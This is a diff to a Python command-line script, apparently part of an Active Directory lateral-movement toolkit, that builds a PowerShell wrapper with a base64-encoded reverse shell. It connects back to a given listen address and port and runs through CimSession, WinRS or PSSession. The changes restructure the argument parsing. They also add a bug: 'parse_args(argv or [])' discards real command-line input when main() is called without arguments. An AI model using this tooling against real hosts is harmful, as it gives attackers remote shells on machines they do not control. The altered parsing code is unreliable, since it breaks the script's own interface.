@@ -1,11 +1,11 @@
 #!/usr/bin/python3
 import argparse
 from textwrap import dedent
-from cimsession import CimSession
-from winrs import Winrs
-from pssession import PSSession
+from ad_lateral_scripts.cimsession import CimSession
+from ad_lateral_scripts.winrs import Winrs
+from ad_lateral_scripts.pssession import PSSession
 
-def main():
+def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
         description="Print a PowerShell wrapper holding a base64-encoded reverse shell."
     )
@@ -14,20 +14,17 @@ def main():
     parser.add_argument("-target_ip", required=True, help="Target IP for CimSession")
     parser.add_argument("-listen_address", required=True, help="IP address to connect back to")
     parser.add_argument("-listen_port", required=True, type=int, help="Port to connect back on")
-    parser.add_argument("-cimsession", action="store_true", help="Utilize WMI PowerShell")
-    parser.add_argument("-winrs", action="store_true", help="Utilize winrs command line application")
-    parser.add_argument("-pssession", action="store_true", help="Utilize a PSSession")
 
-    args = parser.parse_args()
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument("-cimsession", action="store_true", help="Use WMI/CIM PowerShell")
+    group.add_argument("-winrs", action="store_true", help="Use winrs CLI")
+    group.add_argument("-pssession", action="store_true", help="Use PowerShell Remoting (PSSession)")
 
-    # Find all arguments that were defined as booleans
-    bool_flags = [
-        value for key, value in vars(args).items()
-        if isinstance(value, bool)
-    ]
+    return parser
 
-    if not any(bool_flags):
-        parser.error("At Least one of connection method must be specified")
+def main(argv: list[str]| None = None) -> int:
+    parser = build_parser()
+    args = parser.parse_args(argv or [])
 
     if args.cimsession:
         connection = CimSession
@@ -42,6 +39,8 @@ def main():
                 target_ip=args.target_ip,
                 listen_address=args.listen_address,
                 listen_port=args.listen_port))
+    
+    return 0
 
 if __name__ == "__main__":
     main()
